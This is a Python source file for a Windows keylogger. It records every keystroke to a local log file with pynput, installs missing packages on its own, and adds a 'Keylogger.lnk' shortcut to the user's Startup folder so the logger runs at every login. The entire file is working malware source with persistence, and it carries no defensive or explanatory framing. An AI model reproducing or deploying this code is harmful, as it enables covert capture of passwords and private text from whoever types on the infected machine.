import subprocess
import sys
import os
import win32com.client  # Ensure you have the pywin32 package installed

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Try importing the required modules
try:
    from pynput.keyboard import Key, Listener
    from plyer import notification
except ImportError:
    # Install missing packages
    list1 = ['tkinter', 'pynput', 'plyer', 'pywin32']
    for i in list1:
        install(i)

# File to log keystrokes
log_file = "key_log.log"
log_content = ""

def on_press(key):
    global log_content  # to modify
    try:
        if key.char: 
            log_content += key.char  
    except AttributeError:
        if key == Key.backspace:
            log_content = log_content[:-1] 
        else:
            log_content += f" {key} "

    # Write log content to the file
    with open(log_file, "w") as f: 
        f.write(log_content)

def on_release(key):
    # Stop listener on Esc key
    if key == Key.esc:
        return False 

def create_startup_shortcut():
    # Path to your keylogger executable
    keylogger_path = os.path.join(os.path.dirname(sys.executable), "dist", "keylogger.exe")

    # Startup folder path
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    # Create a shortcut
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(os.path.join(startup_folder, "Keylogger.lnk"))
    shortcut.TargetPath = keylogger_path
    shortcut.WorkingDirectory = os.path.dirname(keylogger_path)
    shortcut.save()

# Create a startup shortcut
create_startup_shortcut()

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
